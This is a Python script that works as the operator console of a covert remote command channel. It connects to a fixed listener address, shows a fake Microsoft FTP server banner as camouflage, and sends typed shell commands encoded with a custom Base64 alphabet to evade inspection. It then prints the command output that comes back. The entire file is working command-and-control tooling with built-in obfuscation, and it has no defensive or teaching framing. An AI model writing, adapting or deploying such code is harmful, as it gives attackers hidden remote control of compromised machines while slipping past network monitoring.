import socket

# Custom Base64 encoding function (same as before)
CUSTOM_ALPHABET = "~!@#$%^&*()_+=-0987654321`:;'{jKlMnOpQrStUvWxYzaBcDeFgHi,.<>?[]}"
CUSTOM_ALPHABET_MAP = {char: idx for idx, char in enumerate(CUSTOM_ALPHABET)}

def custom_base64_encode(data: bytes) -> str:
    """Custom Base64 encoding"""
    binary_string = ''.join(f'{byte:08b}' for byte in data)
    chunks = [binary_string[i:i+6] for i in range(0, len(binary_string), 6)]
    padding = len(chunks[-1]) < 6
    if padding:
        chunks[-1] = chunks[-1].ljust(6, '0')
    encoded = ''.join(CUSTOM_ALPHABET[int(chunk, 2)] for chunk in chunks)
    if padding:
        encoded += '#'
    return encoded

# Server details
HOST = '192.168.1.67'  # The IP of the listener.
PORT = 446              # The same port as listener.

# Create the socket connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((HOST, PORT))
    print("220 Microsoft FTP Server on Windows NT \n")
except Exception as e:
    print(f"Error connecting to server: {e}")
    exit()

while True:
    try:
        # Get command from the user (mimicking a command prompt)
        command = input(f"{HOST}> ")

        # Send the custom Base64 encoded exit command if user types 'exit' or 'quit'
        if command.lower() in ['exit', 'quit']:
            encoded_command = custom_base64_encode(command.encode('utf-8'))
            s.send(encoded_command.encode('utf-8'))
            print("[*] Closing connection.")
            break

        # Base64 encode the command using custom alphabet
        encoded_command = custom_base64_encode(command.encode('utf-8'))
        print(f"[*] Sending Encoded Command: {encoded_command}")

        # Send the encoded command
        s.send(encoded_command.encode('utf-8'))

        # Receive and display the output
        output = s.recv(1024).decode('utf-8')
        print(f"[*] Command Output: {output}")
        
    except BrokenPipeError:
        print("[*] Server closed the connection. Exiting.")
        break
    except Exception as e:
        print(f"Error: {e}")
        break

# Close the connection
s.close()
